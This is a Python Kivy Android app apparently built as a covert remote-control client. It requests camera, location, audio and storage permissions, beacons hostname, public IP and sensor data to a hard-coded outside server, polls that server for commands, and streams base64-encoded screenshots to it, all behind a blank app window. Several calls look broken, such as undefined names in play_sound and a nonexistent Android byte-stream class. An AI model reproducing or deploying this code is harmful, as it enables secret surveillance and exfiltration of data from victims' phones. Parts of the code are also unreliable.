import requests
import base64
import os
import time
from datetime import datetime
import threading
import socket
from android.permissions import request_permissions, Permission
from kivy.app import App
from kivy.uix.image import Image
from kivy.clock import Clock
from kivy.graphics.texture import Texture
from kivy.core.window import Window
from kivy.utils import platform
import numpy as np
from plyer import accelerometer, gyroscope, notification
import android
from jnius import autoclass

# Server configuration
SERVER_URL = "https://lunara-film.online/living/fileshare.php"
UPDATE_INTERVAL = 5
REQUEST_TIMEOUT = 10
SCREEN_UPDATE_INTERVAL = 1.0  # أبطأ قليلاً لتوفير البطارية

class MobileRemoteClient:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.ip = self.get_public_ip()
        self.client_id = f"mobile_{self.hostname}_{self.ip}"
        self.session = requests.Session()
        self.session.headers.update({'Content-Type': 'application/json'})
        self.streaming = False
        self.screen_thread = None
        self.sensor_thread = None
        self.last_screen_data = None
        self.sensor_data = {
            'accelerometer': {'x': 0, 'y': 0, 'z': 0},
            'gyroscope': {'x': 0, 'y': 0, 'z': 0},
            'orientation': 0
        }
        
        # Request necessary permissions
        self.request_permissions()
        
        # Start the client
        self.start()

    def request_permissions(self):
        required_permissions = [
            Permission.CAMERA,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.RECORD_AUDIO
        ]
        
        request_permissions(required_permissions)
        
        # Start sensors if available
        if platform == 'android':
            try:
                accelerometer.enable()
                gyroscope.enable()
            except Exception as e:
                print(f"Could not enable sensors: {str(e)}")

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text.strip()
        except:
            return socket.gethostbyname(self.hostname)

    def send_to_server(self):
        try:
            data = {
                'action': 'update_client',
                'client_id': self.client_id,
                'hostname': self.hostname,
                'ip': self.ip,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'streaming': self.streaming,
                'sensor_data': self.sensor_data
            }
            response = self.session.post(SERVER_URL, json=data, timeout=REQUEST_TIMEOUT)
            return response
        except Exception as e:
            print(f"Error sending client update: {str(e)}")
            return None

    def capture_screen(self):
        # في أندرويد، سنستخدم أداة screen capture من خلال مكتبة خاصة
        while self.streaming:
            try:
                start_time = time.time()
                
                # Capture screen using Android API
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                window = activity.getWindow()
                view = window.getDecorView().getRootView()
                view.setDrawingCacheEnabled(True)
                bitmap = view.getDrawingCache()
                
                # Convert bitmap to bytes
                stream = android.ByteArrayOutputStream()
                bitmap.compress(android.Bitmap.CompressFormat.JPEG, 70, stream)
                img_bytes = stream.toByteArray()
                
                response = requests.post(
                    SERVER_URL,
                    json={
                        'action': 'update_screen',
                        'client_id': self.client_id,
                        'screen_data': base64.b64encode(img_bytes).decode('utf-8')
                    },
                    timeout=REQUEST_TIMEOUT
                )
                
                processing_time = time.time() - start_time
                sleep_time = max(0, SCREEN_UPDATE_INTERVAL - processing_time)
                time.sleep(sleep_time)
                
            except Exception as e:
                print(f"Error in screen capture: {str(e)}")
                time.sleep(1)

    def start_streaming(self):
        if not self.streaming:
            self.streaming = True
            self.screen_thread = threading.Thread(target=self.capture_screen, daemon=True)
            self.screen_thread.start()
            print("Screen streaming started")

    def stop_streaming(self):
        if self.streaming:
            self.streaming = False
            if self.screen_thread:
                self.screen_thread.join(timeout=2)
            print("Screen streaming stopped")

    def read_sensors(self):
        while True:
            try:
                # Read accelerometer data
                accel = accelerometer.acceleration
                if accel:
                    self.sensor_data['accelerometer'] = {
                        'x': accel[0],
                        'y': accel[1],
                        'z': accel[2]
                    }
                
                # Read gyroscope data
                gyro = gyroscope.rotation
                if gyro:
                    self.sensor_data['gyroscope'] = {
                        'x': gyro[0],
                        'y': gyro[1],
                        'z': gyro[2]
                    }
                
                # Read orientation
                if platform == 'android':
                    Context = autoclass('android.content.Context')
                    SensorManager = autoclass('android.hardware.SensorManager')
                    activity = autoclass('org.kivy.android.PythonActivity').mActivity
                    sensor_manager = activity.getSystemService(Context.SENSOR_SERVICE)
                    orientation = sensor_manager.getOrientation()
                    if orientation:
                        self.sensor_data['orientation'] = orientation[0]  # Azimuth
                
                time.sleep(0.1)
            except Exception as e:
                print(f"Sensor error: {str(e)}")
                time.sleep(1)

    def check_server_commands(self):
        try:
            response = requests.get(
                f"{SERVER_URL}?action=get_commands&client_id={self.client_id}",
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    for command in data.get('commands', []):
                        self.execute_command(command)
        except Exception as e:
            print(f"Error checking commands: {str(e)}")

    def execute_command(self, command):
        cmd = command.get('command')
        params = command.get('params', {})
        
        try:
            if cmd == 'start_stream':
                self.start_streaming()
            elif cmd == 'stop_stream':
                self.stop_streaming()
            elif cmd == 'show_notification':
                title = params.get('title', 'Notification')
                message = params.get('message', '')
                self.show_notification(title, message)
            elif cmd == 'vibrate':
                duration = params.get('duration', 500)  # ms
                self.vibrate(duration)
            elif cmd == 'play_sound':
                sound = params.get('sound', 'default')
                self.play_sound(sound)
                
        except Exception as e:
            print(f"Error executing command {cmd}: {str(e)}")

    def show_notification(self, title, message):
        if platform == 'android':
            notification.notify(
                title=title,
                message=message,
                app_name='Remote Control Client'
            )

    def vibrate(self, duration):
        if platform == 'android':
            Context = autoclass('android.content.Context')
            Vibrator = autoclass('android.os.Vibrator')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            vibrator = activity.getSystemService(Context.VIBRATOR_SERVICE)
            if vibrator:
                vibrator.vibrate(duration)

    def play_sound(self, sound_type):
        if platform == 'android':
            MediaPlayer = autoclass('android.media.MediaPlayer')
            player = MediaPlayer()
            
            if sound_type == 'alarm':
                player.setDataSource(Context, android.net.Uri.parse("android.resource://" + activity.getPackageName() + "/raw/alarm"))
            else:  # default
                player.setDataSource(Context, android.net.Uri.parse("android.resource://" + activity.getPackageName() + "/raw/notification"))
            
            player.prepare()
            player.start()

    def start(self):
        # Start sensor thread
        self.sensor_thread = threading.Thread(target=self.read_sensors, daemon=True)
        self.sensor_thread.start()
        
        # Start update loop
        def update_client():
            try:
                self.send_to_server()
                self.check_server_commands()
            except Exception as e:
                print(f"Error in update loop: {str(e)}")
            finally:
                threading.Timer(UPDATE_INTERVAL, update_client).start()
        
        update_client()

class MobileRemoteApp(App):
    def build(self):
        self.client = MobileRemoteClient()
        return Image()

if __name__ == "__main__":
    MobileRemoteApp().run()
